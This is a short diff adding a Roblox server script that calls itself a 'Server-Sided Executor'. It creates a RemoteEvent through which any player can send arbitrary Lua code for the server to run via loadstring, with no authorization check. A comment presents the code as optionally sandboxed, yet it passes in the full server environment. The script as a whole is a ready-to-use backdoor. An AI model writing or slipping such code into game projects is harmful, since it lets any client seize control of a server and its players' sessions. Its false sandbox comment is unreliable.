@@ -1,0 +1,40 @@
+-- [ Server-Sided Executor Script ]
+-- Drop this into ServerScriptService
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+-- Create RemoteEvent
+local remote = Instance.new("RemoteEvent")
+remote.Name = "SSExecutor"
+remote.Parent = ReplicatedStorage
+
+-- Function to check if loadstring is available
+local function isLoadstringEnabled()
+	return pcall(function()
+		loadstring("return true")()
+	end)
+end
+
+if not isLoadstringEnabled() then
+	warn("Server loadstring is disabled. Enable 'LoadstringEnabled' in Studio settings.")
+	return
+end
+
+-- Execution Handler
+remote.OnServerEvent:Connect(function(player, code)
+	print(player.Name .. " sent code to execute.")
+	
+	local func, err = loadstring(code)
+	if func then
+		-- Optional: sandbox environment (if needed)
+		setfenv(func, getfenv())
+		
+		-- Execute
+		local success, result = pcall(func)
+		if not success then
+			warn("Error while executing:", result)
+		end
+	else
+		warn("Invalid code:", err)
+	end
+end)
